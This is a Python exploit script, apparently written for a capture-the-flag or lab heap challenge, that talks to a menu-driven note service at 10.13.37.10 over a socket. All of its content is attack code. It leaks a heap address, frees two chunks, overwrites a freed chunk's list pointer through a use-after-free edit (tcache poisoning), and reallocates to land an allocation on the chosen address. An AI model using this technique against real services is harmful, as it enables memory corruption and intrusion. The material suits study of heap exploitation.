import socket, time, re

HOST = "10.13.37.10"
PORT = 21968

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=8)
        self.s.settimeout(0.5)
        self.buf = b""
    def _fill(self, deadline):
        while time.time() < deadline:
            try:
                chunk = self.s.recv(4096)
                if chunk == b"":
                    return
                self.buf += chunk
            except socket.timeout:
                continue
    def read_until_prompt(self, timeout=4.0):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.buf.rstrip(b" ").endswith(b">") or self.buf.endswith(b": "):
                out, self.buf = self.buf, b""
                return out
            self._fill(min(time.time() + 0.3, deadline))
        out, self.buf = self.buf, b""
        return out
    def cmd(self, data, timeout=4.0):
        if isinstance(data, str):
            data = data.encode()
        try:
            self.s.sendall(data + b"\n")
        except (BrokenPipeError, OSError) as e:
            return f"<<SEND FAILED: {e}>>".encode()
        return self.read_until_prompt(timeout)
    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

def hexdump(s):
    m = re.search(rb"raw:([0-9a-f]+)", s)
    return m.group(1).decode() if m else None

c = Conn()
print(c.read_until_prompt(3.0).decode(errors="replace"))

def new(slot, ln, data):
    c.cmd("1"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def edit(slot, ln, data):
    c.cmd("2"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def free(slot):
    c.cmd("3"); return c.cmd(str(slot))
def show(slot):
    c.cmd("4"); return c.cmd(str(slot))

r = new(0, 16, "A"*16); print("new0:", r.decode(errors="replace"))
s0 = show(0)
h0 = hexdump(s0)
raw_target_addr = int.from_bytes(bytes.fromhex(h0[64:80]), "little")
target_addr = raw_target_addr & ~0xF
target_bytes = target_addr.to_bytes(8, "little")
print(f"raw={hex(raw_target_addr)} aligned={hex(target_addr)}")

r = new(1, 16, "B"*16); print("new1:", r.decode(errors="replace"))
r = free(0); print("free0:", r.decode(errors="replace"))
r = free(1); print("free1:", r.decode(errors="replace"))
r = edit(1, 16, target_bytes + b"\x00"*8)
print("edit1 poison:", r.decode(errors="replace"))
r = new(2, 16, "C"*16); print("new2 (pop chunk1):", r.decode(errors="replace"))

print("--- new3 step by step ---")
r = c.cmd("1"); print("after '1':", r.decode(errors="replace"))
r = c.cmd("3"); print("after slot='3':", r.decode(errors="replace"))
r = c.cmd("16"); print("after len='16':", r.decode(errors="replace"))
r = c.cmd("D"*16); print("after name data:", r.decode(errors="replace"))

c.close()
